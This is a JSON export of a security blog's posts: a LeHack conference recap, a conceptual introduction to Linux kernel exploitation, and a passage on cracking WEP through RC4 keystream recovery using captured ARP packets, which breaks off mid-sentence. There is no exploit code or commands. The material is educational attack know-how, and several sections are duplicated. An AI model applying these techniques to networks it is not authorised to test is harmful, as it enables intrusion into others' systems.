[{"categories":["Thoughts"],"collections":["Events"],"content":"LeHack, one of the most renowned cybersecurity events in Europe, had been on my radar for a while. Known for its thrilling Capture The Flag (CTF) challenges, hands-on workshops, and the opportunity to meet some of the brightest minds in cybersecurity, I knew it would be a day to remember. From the moment I registered, I couldn’t wait to dive into the challenges that awaited me. Upon arriving, the buzz was palpable. People from all walks of cybersecurity—ethical hackers, penetration testers, and curious enthusiasts—gathered under one roof to push the limits of what we could learn and achieve. The event had a relaxed yet competitive vibe, and I was immediately pulled into the spirit of the community. The workshops were a perfect mix of theory and practice. One of the most interesting sessions was dedicated to IoT vulnerabilities. We learned how easily common devices could be exploited if not properly secured. It was fascinating to see the instructor demonstrate in real time how an insecure device could be hacked—something I had only read about until then. The hands-on nature of these sessions made it feel less like a lecture and more like an immersion into real-world hacking. Of course, the CTF challenges were one of the main attractions of LeHack. These competitions are a test of skill, speed, and creativity, where participants work in teams or alone to solve cybersecurity puzzles and hack into systems. I joined a team for a few challenges, and the adrenaline was incredible. The problems ranged from exploiting web vulnerabilities to decrypting encrypted messages. It was intense, but each solved challenge brought a rush of accomplishment. One of the most eye-opening moments was during the live hacking demonstrations. Watching experts break into systems—demonstrating both the simplicity and complexity of cybersecurity flaws—was simultaneously awe-inspiring and sobering. It really hit home just how important it is to understand the vulnerabilities in systems we interact with every day. Networking was another major aspect of LeHack. Between the workshops and CTF breaks, I had the opportunity to chat with like-minded individuals who share a deep passion for cybersecurity. I met penetration testers, security researchers, and even students just beginning their journey into hacking. We exchanged knowledge, tips, and strategies, and I left with more resources and contacts than I ever expected. As the day came to a close, I felt a deep sense of fulfillment. LeHack had offered me not only an opportunity to test and improve my skills but also to connect with others in the community. The challenges, both technical and personal, had pushed me to learn more, think faster, and expand my cybersecurity knowledge in ways I never imagined. LeHack is an event that I highly recommend to anyone interested in cybersecurity—whether you’re just starting or are already an experienced professional. It’s an experience that goes beyond learning; it’s about pushing your limits, sharing knowledge, and becoming part of a vibrant community dedicated to cybersecurity. ","date":"2025-06-27","objectID":"/posts/hack5/:0:0","tags":["Journey"],"title":"LeHack Adventure 2025","uri":"/posts/hack5/#"},{"categories":["Guides"],"collections":["Getting Started"],"content":"29 About In this first part of our Linux Kernel Exploitation series, we’ll lay down the essential knowledge needed to understand what the Linux kernel is, why it matters in security, and how vulnerabilities at this low level can impact entire systems. The Linux kernel is the core component that manages hardware, processes, memory, and system resources. It acts as the critical bridge between software applications and the physical machine. Because it runs with the highest privileges, any flaw or exploit within the kernel can give attackers full control over a system. Understanding kernel exploitation is a complex but rewarding journey. It requires a solid grasp of operating system internals, memory management, system calls, and security mechanisms. Caution Ethical Hacking Reminder: Only perform kernel penetration tests on networks you own or have explicit permission to test. Unauthorized hacking is illegal and unethical. ","date":"2025-06-14","objectID":"/posts/kernel01/:1:0","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#about"},{"categories":["Guides"],"collections":["Getting Started"],"content":"30 Linux Kernel Exploitation In today’s computing landscape, the Linux kernel stands at the heart of countless systems — from personal computers and servers to cloud infrastructures and embedded devices. It manages critical functions like memory, processes, and hardware communication, silently powering the technology we rely on every day. But have you ever wondered how this complex piece of software actually works under the hood? What happens when vulnerabilities arise deep within the kernel, and how can attackers leverage them to gain control over entire systems? In this series, Linux Kernel Exploitation we will delve into the core of the Linux operating system, uncovering how the kernel operates, how security mechanisms protect it, and how these protections can sometimes be bypassed. We’ll explore practical techniques for setting up a controlled lab environment, analyzing kernel behavior, and developing exploits—all while building a strong foundation of understanding. ","date":"2025-06-14","objectID":"/posts/kernel01/:2:0","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#linux-kernel-exploitation"},{"categories":["Guides"],"collections":["Getting Started"],"content":"31 What is the Linux Kernel? The Linux kernel is the core component of the Linux operating system. It acts as a bridge between software applications and the physical hardware of a computer. Managing everything from CPU scheduling and memory allocation to device communication and system security, the kernel ensures that all parts of the system work together seamlessly. Because it operates with the highest level of privilege on the machine (ring 0), the kernel has complete control over the system’s resources and hardware. This central role makes it both incredibly powerful and a critical target for attackers. ","date":"2025-06-14","objectID":"/posts/kernel01/:3:0","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#what-is-the-linux-kernel"},{"categories":["Guides"],"collections":["Getting Started"],"content":"32 Key Concepts Before diving into exploitation, it’s essential to understand some key aspects of the Linux kernel. These foundational concepts help explain why the kernel is such a powerful — and attractive — target. Concept Description Privilege Levels The kernel runs in ring 0, with full access to hardware and memory. User applications run in ring 3. Monolithic Architecture Linux uses a monolithic kernel, meaning it includes device drivers and modules within the kernel space. Syscalls System calls are the interface between user applications and the kernel (e.g., read(), write()). Kernel Space vs User Space Separation between kernel memory and user memory helps maintain system stability and security. Memory Management The kernel controls virtual memory, paging, and physical memory allocation. Modules Kernel modules are pieces of code that can be dynamically loaded into the kernel (e.g., drivers). Scheduling Responsible for task switching, process priorities, and CPU time allocation. Filesystem Interface The kernel manages filesystems and interacts with storage devices. These components are often the basis for real-world vulnerabilities, such as buffer overflows in device drivers or misconfigurations in syscall implementations. ","date":"2025-06-14","objectID":"/posts/kernel01/:4:0","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#key-concepts"},{"categories":["Guides"],"collections":["Getting Started"],"content":"33 Evolution Linux has evolved dramatically since its first release in 1991. With each new version, features, performance, and security mechanisms have been improved — but so have the opportunities for discovering bugs. Year Kernel Version Key Features Introduced 1991 0.01 First public release by Linus Torvalds 2001 2.4.x Netfilter/iptables, improved USB support, enhanced memory management 2003 2.6.x Kernel preemption, Native POSIX threads, SELinux integration 2011 3.x Improved scalability, transparent huge pages, Btrfs improvements 2015 4.x Live patching, better NUMA support, perf events framework 2020 5.x WireGuard VPN integration, io_uring, improved hardware support 2024 6.x Ongoing enhancements to Rust support, memory isolation features, more secure syscall filtering Note Even as security mechanisms improve, new vulnerabilities continue to emerge — especially in device drivers and legacy code that hasn’t aged well. ","date":"2025-06-14","objectID":"/posts/kernel01/:5:0","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#evolution"},{"categories":["Guides"],"collections":["Getting Started"],"content":"34 Basic Terms ","date":"2025-06-14","objectID":"/posts/kernel01/:6:0","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#basic-terms"},{"categories":["Guides"],"collections":["Getting Started"],"content":"34.1 Security Mechanisms Modern Linux kernels implement multiple layers of defense to make exploitation harder. Understanding these is crucial to learning how attackers bypass them. Mechanism Description Mitigation Strength (0-10) KASLR Randomizes kernel memory layout to prevent predictable memory addresses. 8 SMEP/SMAP Prevents kernel from executing or accessing user-space memory. 9 Stack Canaries Detects and prevents stack buffer overflow attacks by checking integrity before function return. 7 NX (No-eXecute) Marks memory regions non-executable to prevent code injection attacks. 8 Seccomp Restricts system calls allowed for processes, reducing attack surface. 6 AppArmor/SELinux Mandatory Access Control enforcing strict policies on program capabilities. 5 In the upcoming parts, we’ll study how these protections work — and how to defeat or bypass them when developing kernel exploits. { title: { text: 'Kernel Defense Mechanisms Overview', left: 'center', top: '2%' }, tooltip: { trigger: 'item' }, radar: { indicator: [ { name: 'KASLR', max: 10 }, { name: 'SMEP/SMAP', max: 10 }, { name: 'Stack Canaries', max: 10 }, { name: 'NX', max: 10 }, { name: 'Seccomp', max: 10 }, { name: 'AppArmor/SELinux', max: 10 } ], radius: '60%', splitNumber: 4 }, series: [{ name: 'Kernel Defenses', type: 'radar', data: [{ value: [8, 9, 7, 8, 6, 5], name: 'Mitigation Strength', lineStyle: { color: '#66CFFF' }, itemStyle: { color: '#66CFFF' }, areaStyle: { color: 'rgba(102,207,255,0.3)' } }] }] }","date":"2025-06-14","objectID":"/posts/kernel01/:6:1","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#security-mechanisms"},{"categories":["Guides"],"collections":["Getting Started"],"content":"34.2 User Space vs Kernel Space Linux divides system memory into two distinct areas to ensure security and stability: User Space: This is where regular applications run—web browsers, editors, scripts, and so on. Programs in user space have limited access to system resources and cannot interact directly with hardware or critical kernel data. This isolation helps prevent accidental or malicious damage to the system. Kernel Space: This is where the Linux kernel operates, with full control over hardware, memory management, process scheduling, device drivers, and system security. Kernel code runs with the highest privileges (called ring 0), allowing unrestricted access to all system resources. This separation between user and kernel spaces is vital. When a user program needs to perform an operation requiring elevated privileges—like reading a file or sending network data—it must communicate with the kernel through a controlled interface called a system call. Note The Linux kernel runs in ring 0, which is the most privileged CPU mode. All user programs run in ring 3, with limited access. ","date":"2025-06-14","objectID":"/posts/kernel01/:6:2","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#user-space-vs-kernel-space"},{"categories":["Guides"],"collections":["Getting Started"],"content":"34.3 What is a System Call? A system call (syscall) is a controlled gateway for user-space programs to request services from the kernel. It acts as a safe bridge between restricted applications and the privileged kernel. When a syscall is invoked, the CPU switches from user mode (ring 3) to kernel mode (ring 0). The kernel then executes the requested operation—such as opening a file, allocating memory, or sending data—and finally returns control back to the user program. Common examples of syscalls include read(), write(), open(), and mmap(). This mechanism is critical because it maintains system stability and security while still allowing user applications to perform necessary tasks. ","date":"2025-06-14","objectID":"/posts/kernel01/:6:3","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#what-is-a-system-call"},{"categories":["Guides"],"collections":["Getting Started"],"content":"34.4 Kernel Memory Layout The Linux kernel’s memory is organized into several segments, each serving a different purpose: Segment Description Text (code) Contains the executable instructions of the kernel itself Data Holds global variables and static data, both initialized and uninitialized Heap Area used for dynamic memory allocations within the kernel Stack Used for per-thread function calls, local variables, and return addresses To increase security, modern kernels implement protections like Kernel Address Space Layout Randomization (KASLR), which randomizes the locations of these memory segments at boot time. This makes it much harder for attackers to predict where critical kernel code or data reside, complicating exploitation attempts. The text segment holds executable code and is often targeted for code injection or modification. The data and heap segments are frequent targets for overflow or corruption attacks. The stack is critical for control flow and vulnerable to buffer overflows and return-oriented programming (ROP) attacks. ","date":"2025-06-14","objectID":"/posts/kernel01/:6:4","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#kernel-memory-layout"},{"categories":["Guides"],"collections":["Getting Started"],"content":"34.5 Common Kernel Vulnerabilities The kernel, despite its protections, can have bugs that lead to vulnerabilities. Some of the most common types include: Vulnerability Description Buffer Overflow Occurs when data is written beyond the bounds of a buffer, potentially overwriting important control data or code pointers. This can lead to arbitrary code execution. Use-After-Free Happens when the kernel accesses memory that has already been freed, leading to undefined behavior or exploitation opportunities. Race Conditions Arise when multiple threads or processes access shared resources simultaneously, causing inconsistent or unexpected states that attackers can exploit. Integer Overflows Errors in arithmetic calculations can result in incorrect memory size computations, leading to memory corruption or buffer overflows. Understanding these vulnerabilities is key to developing kernel exploits and also to designing better defenses. ","date":"2025-06-14","objectID":"/posts/kernel01/:6:5","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#common-kernel-vulnerabilities"},{"categories":["Guides"],"collections":["Getting Started"],"content":"34.6 Kernel Modules Kernel modules are pieces of code—often device drivers or filesystem drivers—that can be dynamically loaded and unloaded into the kernel at runtime. Since modules run with full kernel privileges, any flaw or bug in their code can directly compromise the entire system. Poorly written or malicious modules are frequent sources of kernel vulnerabilities and exploitation vectors. graph LR Kernel[\"Kernel Space\"] Module[\"Kernel Module\"] Hardware[\"Hardware Device\"] UserApp[\"User Application\"] UserApp --\u003e|Syscalls| Kernel Kernel --\u003e|Loads| Module Module --\u003e|Controls| Hardware Module --\u003e|Calls Kernel APIs| Kernel graph LR Kernel[\"Kernel Space\"] Module[\"Kernel Module\"] Hardware[\"Hardware Device\"] UserApp[\"User Application\"] UserApp --\u003e|Syscalls| Kernel Kernel --\u003e|Loads| Module Module --\u003e|Controls| Hardware Module --\u003e|Calls Kernel APIs| Kernel graph LR Kernel[\"Kernel Space\"] Module[\"Kernel Module\"] Hardware[\"Hardware Device\"] UserApp[\"User Application\"] UserApp --\u003e|Syscalls| Kernel Kernel --\u003e|Loads| Module Module --\u003e|Controls| Hardware Module --\u003e|Calls Kernel APIs| Kernel graph LR Kernel[\"Kernel Space\"] Module[\"Kernel Module\"] Hardware[\"Hardware Device\"] UserApp[\"User Application\"] UserApp --\u003e|Syscalls| Kernel Kernel --\u003e|Loads| Module Module --\u003e|Controls| Hardware Module --\u003e|Calls Kernel APIs| Kernel ","date":"2025-06-14","objectID":"/posts/kernel01/:6:6","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#kernel-modules"},{"categories":["Guides"],"collections":["Getting Started"],"content":"34.7 Exploit Development Workflow Developing a kernel exploit typically follows a multi-step process: Vulnerability Discovery Finding bugs via code auditing, fuzzing, or analyzing kernel crash reports. Proof of Concept (PoC) Creating a minimal piece of code that reliably triggers the vulnerability to confirm its existence. Exploit Development Crafting a payload that leverages the bug to escalate privileges, usually from user space (ring 3) to kernel space (ring 0). Bypassing Protections Implementing techniques to circumvent kernel defenses such as KASLR, SMEP/SMAP (Supervisor Mode Execution/Access Prevention), and stack canaries. Payload Execution Running the final payload with kernel-level privileges to achieve goals like root shell access or kernel memory manipulation. 34.7.1 Stack \u0026 Heap Stack: Used for managing function calls and local variables. Vulnerabilities like stack buffer overflows are common. Heap: A dynamic memory region for allocating objects at runtime. Heap corruption is another common exploitation vector. 34.7.2 Device Driver A device driver is kernel code that allows the OS to interface with hardware (e.g., network cards, USB devices). Poorly written drivers are a frequent source of kernel vulnerabilities. 34.7.3 Context Switch A context switch occurs when the CPU changes from executing one process to another. The kernel is responsible for this operation, and it involves saving and restoring process states. ","date":"2025-06-14","objectID":"/posts/kernel01/:6:7","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#exploit-development-workflow"},{"categories":["Guides"],"collections":["Getting Started"],"content":"34.7 Exploit Development Workflow Developing a kernel exploit typically follows a multi-step process: Vulnerability Discovery Finding bugs via code auditing, fuzzing, or analyzing kernel crash reports. Proof of Concept (PoC) Creating a minimal piece of code that reliably triggers the vulnerability to confirm its existence. Exploit Development Crafting a payload that leverages the bug to escalate privileges, usually from user space (ring 3) to kernel space (ring 0). Bypassing Protections Implementing techniques to circumvent kernel defenses such as KASLR, SMEP/SMAP (Supervisor Mode Execution/Access Prevention), and stack canaries. Payload Execution Running the final payload with kernel-level privileges to achieve goals like root shell access or kernel memory manipulation. 34.7.1 Stack \u0026 Heap Stack: Used for managing function calls and local variables. Vulnerabilities like stack buffer overflows are common. Heap: A dynamic memory region for allocating objects at runtime. Heap corruption is another common exploitation vector. 34.7.2 Device Driver A device driver is kernel code that allows the OS to interface with hardware (e.g., network cards, USB devices). Poorly written drivers are a frequent source of kernel vulnerabilities. 34.7.3 Context Switch A context switch occurs when the CPU changes from executing one process to another. The kernel is responsible for this operation, and it involves saving and restoring process states. ","date":"2025-06-14","objectID":"/posts/kernel01/:6:7","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#stack--heap"},{"categories":["Guides"],"collections":["Getting Started"],"content":"34.7 Exploit Development Workflow Developing a kernel exploit typically follows a multi-step process: Vulnerability Discovery Finding bugs via code auditing, fuzzing, or analyzing kernel crash reports. Proof of Concept (PoC) Creating a minimal piece of code that reliably triggers the vulnerability to confirm its existence. Exploit Development Crafting a payload that leverages the bug to escalate privileges, usually from user space (ring 3) to kernel space (ring 0). Bypassing Protections Implementing techniques to circumvent kernel defenses such as KASLR, SMEP/SMAP (Supervisor Mode Execution/Access Prevention), and stack canaries. Payload Execution Running the final payload with kernel-level privileges to achieve goals like root shell access or kernel memory manipulation. 34.7.1 Stack \u0026 Heap Stack: Used for managing function calls and local variables. Vulnerabilities like stack buffer overflows are common. Heap: A dynamic memory region for allocating objects at runtime. Heap corruption is another common exploitation vector. 34.7.2 Device Driver A device driver is kernel code that allows the OS to interface with hardware (e.g., network cards, USB devices). Poorly written drivers are a frequent source of kernel vulnerabilities. 34.7.3 Context Switch A context switch occurs when the CPU changes from executing one process to another. The kernel is responsible for this operation, and it involves saving and restoring process states. ","date":"2025-06-14","objectID":"/posts/kernel01/:6:7","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#device-driver"},{"categories":["Guides"],"collections":["Getting Started"],"content":"34.7 Exploit Development Workflow Developing a kernel exploit typically follows a multi-step process: Vulnerability Discovery Finding bugs via code auditing, fuzzing, or analyzing kernel crash reports. Proof of Concept (PoC) Creating a minimal piece of code that reliably triggers the vulnerability to confirm its existence. Exploit Development Crafting a payload that leverages the bug to escalate privileges, usually from user space (ring 3) to kernel space (ring 0). Bypassing Protections Implementing techniques to circumvent kernel defenses such as KASLR, SMEP/SMAP (Supervisor Mode Execution/Access Prevention), and stack canaries. Payload Execution Running the final payload with kernel-level privileges to achieve goals like root shell access or kernel memory manipulation. 34.7.1 Stack \u0026 Heap Stack: Used for managing function calls and local variables. Vulnerabilities like stack buffer overflows are common. Heap: A dynamic memory region for allocating objects at runtime. Heap corruption is another common exploitation vector. 34.7.2 Device Driver A device driver is kernel code that allows the OS to interface with hardware (e.g., network cards, USB devices). Poorly written drivers are a frequent source of kernel vulnerabilities. 34.7.3 Context Switch A context switch occurs when the CPU changes from executing one process to another. The kernel is responsible for this operation, and it involves saving and restoring process states. ","date":"2025-06-14","objectID":"/posts/kernel01/:6:7","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#context-switch"},{"categories":["Guides"],"collections":["Getting Started"],"content":"35 Conclusion In this first part, we explored the foundational concepts of the Linux kernel, its memory layout, key defense mechanisms, and common vulnerabilities that affect this critical part of the system. Understanding these basics is essential for anyone looking to dive into kernel exploitation, as they shape how attacks are crafted and defenses bypassed. In the upcoming parts, we will dive into practical exploitation examples, setting up a safe testing environment, and techniques to analyze and circumvent kernel protections. ","date":"2025-06-14","objectID":"/posts/kernel01/:7:0","tags":["Kernel","Exploit Development"],"title":"Linux Kernel Exploitation Part 1","uri":"/posts/kernel01/#conclusion"},{"categories":["Guides"],"collections":["Getting Started"],"content":"33 About In Part 3 of our Wireless Hacking series, we will delve into the practical application of wireless attacks. After exploring the basics of Wi-Fi and setting up a safe testing environment, it’s time to get hands-on. In this post, we’ll focus on attacking WEP (Wired Equivalent Privacy) — a once-standard but now outdated and highly vulnerable wireless encryption protocol. In this post, you’ll learn how WEP works, the cryptographic weaknesses it suffers from, and step-by-step how to exploit these flaws using tools like aircrack-ng and aireplay-ng. By the end, you’ll understand why WEP is obsolete and how attackers can recover a WEP key within minutes. Caution Ethical Hacking Reminder: Only perform wireless penetration tests on networks you own or have explicit permission to test. Unauthorized hacking is illegal and unethical. ","date":"2025-05-26","objectID":"/posts/wireless03/:1:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 3","uri":"/posts/wireless03/#about"},{"categories":["Guides"],"collections":["Getting Started"],"content":"34 RC4/ Stream Cipher The process starts when the user creates a root key of size 128 bits. This root key is then encrypted using the RC4 algorithm, which generates a keystream. Once the keystream is generated, it is combined with the plaintext data using an XOR gate (logical operation). The result of this operation gives us the ciphertext, which can then be sent. graph TD RootKey[\"Root Key (128 bits)\"] RC4[\"RC4 Algorithm\"] Keystream[\"Keystream (Generated by RC4)\"] Plaintext[\"Plaintext Data\"] XOR[\"XOR Operation\"] Ciphertext[\"Ciphertext (Output)\"] RootKey --\u003e RC4 RC4 --\u003e Keystream Keystream --\u003e XOR Plaintext --\u003e XOR XOR --\u003e Ciphertext graph TD RootKey[\"Root Key (128 bits)\"] RC4[\"RC4 Algorithm\"] Keystream[\"Keystream (Generated by RC4)\"] Plaintext[\"Plaintext Data\"] XOR[\"XOR Operation\"] Ciphertext[\"Ciphertext (Output)\"] RootKey --\u003e RC4 RC4 --\u003e Keystream Keystream --\u003e XOR Plaintext --\u003e XOR XOR --\u003e Ciphertext graph TD RootKey[\"Root Key (128 bits)\"] RC4[\"RC4 Algorithm\"] Keystream[\"Keystream (Generated by RC4)\"] Plaintext[\"Plaintext Data\"] XOR[\"XOR Operation\"] Ciphertext[\"Ciphertext (Output)\"] RootKey --\u003e RC4 RC4 --\u003e Keystream Keystream --\u003e XOR Plaintext --\u003e XOR XOR --\u003e Ciphertext graph TD RootKey[\"Root Key (128 bits)\"] RC4[\"RC4 Algorithm\"] Keystream[\"Keystream (Generated by RC4)\"] Plaintext[\"Plaintext Data\"] XOR[\"XOR Operation\"] Ciphertext[\"Ciphertext (Output)\"] RootKey --\u003e RC4 RC4 --\u003e Keystream Keystream --\u003e XOR Plaintext --\u003e XOR XOR --\u003e Ciphertext ","date":"2025-05-26","objectID":"/posts/wireless03/:2:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 3","uri":"/posts/wireless03/#rc4-stream-cipher"},{"categories":["Guides"],"collections":["Getting Started"],"content":"35 WEP Packet The process of sending a packet using WEP begins with appending a 24-bit Initialization Vector (IV) to the root key. This new combined key is then input into the RC4 encryption algorithm, which generates a keystream unique to that packet. Next, this keystream is combined with the plaintext data using an XOR operation, producing the ciphertext that will be transmitted over the wireless network. Since the IV changes with every packet, it is appended along with the ciphertext. This is necessary because the receiving device (such as a router) needs the IV to recreate the same keystream and correctly decrypt the message. Without the IV, decryption would not be possible, as the key would not match the keystream used for encryption. graph TD RootKey[\"Root Key (128 bits)\"] IV[\"IV (24 bits)\"] RC4[\"RC4 Algorithm\"] Keystream[\"Keystream: 1101101010110010101 1001010110010101\"] Plaintext[\"Plain Text:\\nGET / HTTP 1.1\\nHost: google.com\"] XOR[\"XOR Operation\"] Ciphertext[\"Ciphertext:\\na1b2c3d4e5f67890==\"] RootKey --\u003e RC4 IV --\u003e RC4 RC4 --\u003e Keystream Keystream --\u003e XOR Plaintext --\u003e XOR XOR --\u003e Ciphertext graph TD RootKey[\"Root Key (128 bits)\"] IV[\"IV (24 bits)\"] RC4[\"RC4 Algorithm\"] Keystream[\"Keystream: 1101101010110010101 1001010110010101\"] Plaintext[\"Plain Text:\\nGET / HTTP 1.1\\nHost: google.com\"] XOR[\"XOR Operation\"] Ciphertext[\"Ciphertext:\\na1b2c3d4e5f67890==\"] RootKey --\u003e RC4 IV --\u003e RC4 RC4 --\u003e Keystream Keystream --\u003e XOR Plaintext --\u003e XOR XOR --\u003e Ciphertext graph TD RootKey[\"Root Key (128 bits)\"] IV[\"IV (24 bits)\"] RC4[\"RC4 Algorithm\"] Keystream[\"Keystream: 1101101010110010101 1001010110010101\"] Plaintext[\"Plain Text:\\nGET / HTTP 1.1\\nHost: google.com\"] XOR[\"XOR Operation\"] Ciphertext[\"Ciphertext:\\na1b2c3d4e5f67890==\"] RootKey --\u003e RC4 IV --\u003e RC4 RC4 --\u003e Keystream Keystream --\u003e XOR Plaintext --\u003e XOR XOR --\u003e Ciphertext graph TD RootKey[\"Root Key (128 bits)\"] IV[\"IV (24 bits)\"] RC4[\"RC4 Algorithm\"] Keystream[\"Keystream: 1101101010110010101 1001010110010101\"] Plaintext[\"Plain Text:\\nGET / HTTP 1.1\\nHost: google.com\"] XOR[\"XOR Operation\"] Ciphertext[\"Ciphertext:\\na1b2c3d4e5f67890==\"] RootKey --\u003e RC4 IV --\u003e RC4 RC4 --\u003e Keystream Keystream --\u003e XOR Plaintext --\u003e XOR XOR --\u003e Ciphertext ","date":"2025-05-26","objectID":"/posts/wireless03/:3:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 3","uri":"/posts/wireless03/#wep-packet"},{"categories":["Guides"],"collections":["Getting Started"],"content":"36 Router-side Decryption During router-side decryption, the process begins by appending the root key with the 24-bit Initialization Vector (IV) extracted from the received data packet. This new key is then used as input to the RC4 algorithm, which generates a pseudorandom keystream. Next, this keystream is combined with the ciphertext using an XOR operation. graph TD RootKey[\"Root Key (128 bits)\"] IV[\"IV (24 bits)\"] RC4[\"RC4 Algorithm\"] Keystream[\"Keystream: 1101101010110010101 1001010110010101\"] XOR[\"XOR Operation\"] Ciphertext[\"Ciphertext:\\na1b2c3d4e5f67890==\"] Plaintext[\"Plain Text:\\nGET / HTTP 1.1\\nHost: google.com\"] RootKey --\u003e RC4 IV --\u003e RC4 RC4 --\u003e Keystream Keystream --\u003e XOR Ciphertext --\u003e XOR XOR --\u003e Plaintext graph TD RootKey[\"Root Key (128 bits)\"] IV[\"IV (24 bits)\"] RC4[\"RC4 Algorithm\"] Keystream[\"Keystream: 1101101010110010101 1001010110010101\"] XOR[\"XOR Operation\"] Ciphertext[\"Ciphertext:\\na1b2c3d4e5f67890==\"] Plaintext[\"Plain Text:\\nGET / HTTP 1.1\\nHost: google.com\"] RootKey --\u003e RC4 IV --\u003e RC4 RC4 --\u003e Keystream Keystream --\u003e XOR Ciphertext --\u003e XOR XOR --\u003e Plaintext graph TD RootKey[\"Root Key (128 bits)\"] IV[\"IV (24 bits)\"] RC4[\"RC4 Algorithm\"] Keystream[\"Keystream: 1101101010110010101 1001010110010101\"] XOR[\"XOR Operation\"] Ciphertext[\"Ciphertext:\\na1b2c3d4e5f67890==\"] Plaintext[\"Plain Text:\\nGET / HTTP 1.1\\nHost: google.com\"] RootKey --\u003e RC4 IV --\u003e RC4 RC4 --\u003e Keystream Keystream --\u003e XOR Ciphertext --\u003e XOR XOR --\u003e Plaintext graph TD RootKey[\"Root Key (128 bits)\"] IV[\"IV (24 bits)\"] RC4[\"RC4 Algorithm\"] Keystream[\"Keystream: 1101101010110010101 1001010110010101\"] XOR[\"XOR Operation\"] Ciphertext[\"Ciphertext:\\na1b2c3d4e5f67890==\"] Plaintext[\"Plain Text:\\nGET / HTTP 1.1\\nHost: google.com\"] RootKey --\u003e RC4 IV --\u003e RC4 RC4 --\u003e Keystream Keystream --\u003e XOR Ciphertext --\u003e XOR XOR --\u003e Plaintext The result is the original data stream requested by the device. However, it is important to note that the mathematical weaknesses of RC4 expose this method to vulnerabilities: by collecting enough keystreams associated with different IV values, an attacker can analyze the data to recover the network’s secret key. ","date":"2025-05-26","objectID":"/posts/wireless03/:4:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 3","uri":"/posts/wireless03/#router-side-decryption"},{"categories":["Guides"],"collections":["Getting Started"],"content":"37 Methodology Cracking a wireless network — especially one secured with WEP — relies on a deep understanding of stream cipher mechanics. At the heart of this process is the extraction of a keystream, a pseudorandom sequence used to encrypt data. To obtain the keystream, you need both ciphertext and at least a portion of the plaintext. By XORing the two, the keystream can be revealed, which can then be reused to decrypt other packets or even recover the original WEP key. graph TD Ciphertext[\"Ciphertext: na1b2c3d4e5f67890==\"] PlainText[\"Plain Text: GET / HTTP 1.1\\nHost: google.com\"] XOR[\"XOR Operation\"] Keystream[\"Keystream: 1101101010110010101 1001010110010101\"] Ciphertext --\u003e XOR PlainText --\u003e XOR XOR --\u003e Keystream graph TD Ciphertext[\"Ciphertext: na1b2c3d4e5f67890==\"] PlainText[\"Plain Text: GET / HTTP 1.1\\nHost: google.com\"] XOR[\"XOR Operation\"] Keystream[\"Keystream: 1101101010110010101 1001010110010101\"] Ciphertext --\u003e XOR PlainText --\u003e XOR XOR --\u003e Keystream graph TD Ciphertext[\"Ciphertext: na1b2c3d4e5f67890==\"] PlainText[\"Plain Text: GET / HTTP 1.1\\nHost: google.com\"] XOR[\"XOR Operation\"] Keystream[\"Keystream: 1101101010110010101 1001010110010101\"] Ciphertext --\u003e XOR PlainText --\u003e XOR XOR --\u003e Keystream graph TD Ciphertext[\"Ciphertext: na1b2c3d4e5f67890==\"] PlainText[\"Plain Text: GET / HTTP 1.1\\nHost: google.com\"] XOR[\"XOR Operation\"] Keystream[\"Keystream: 1101101010110010101 1001010110010101\"] Ciphertext --\u003e XOR PlainText --\u003e XOR XOR --\u003e Keystream The first practical step is capturing ciphertext, which is relatively straightforward. By setting your wireless interface to monitor mode, you can passively listen to all wireless traffic in range. This allows you to capture encrypted packets — including ARP requests and broadcast messages — without needing to be connected to the network. These packets become the foundation for further steps like traffic injection, keystream recovery, and ultimately key extraction. This methodology is central to WEP cracking and sets the stage for more advanced techniques, such as ARP replay attacks and dictionary-based keystream matching, which exploit predictable plaintext to speed up the attack process. ","date":"2025-05-26","objectID":"/posts/wireless03/:5:0","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 3","uri":"/posts/wireless03/#methodology"},{"categories":["Guides"],"collections":["Getting Started"],"content":"37.1 Capture Ciphertext Capturing ciphertext is relatively simple. By setting the network adapter to monitor mode, it becomes possible to listen to and collect wireless data packets transmitted over the air. ","date":"2025-05-26","objectID":"/posts/wireless03/:5:1","tags":["Web Security","Wireless"],"title":"Wireless Hacking Part 3","uri":"/posts/wireless03/#capture-ciphertext"},{"categories":["Guides"],"collections":["Getting Started"],"content":"37.2 Retrieve Plaintext Extracting the plaintext from encrypted packets is a more complex task. Fortunately, the ARP (Address Resolution Protocol) provides useful assistance in this process. ARP operates with two primary packet types: requests and replies. An ARP request is essentially a broadcast message that asks for the MAC address corresponding to a specific IP on the local network — for instance, “Who has IP 10.20.242.34?” In turn, the device with that IP responds with an ARP reply, sharing its MAC address, such as “I have 10.20.242.34, MAC address e4:35:54:ad:4f:45.” A key point is that both ARP request and reply packets contain a header of fixed, predictable length — 16 bytes. By capturing these packets, it is possible to know part of the plaintext in advance. This known plaintext can then be used to recover the initial bytes of the encryption keystream. Therefore, capturing a large number of ARP packets significantly aids the decryption effort. However, 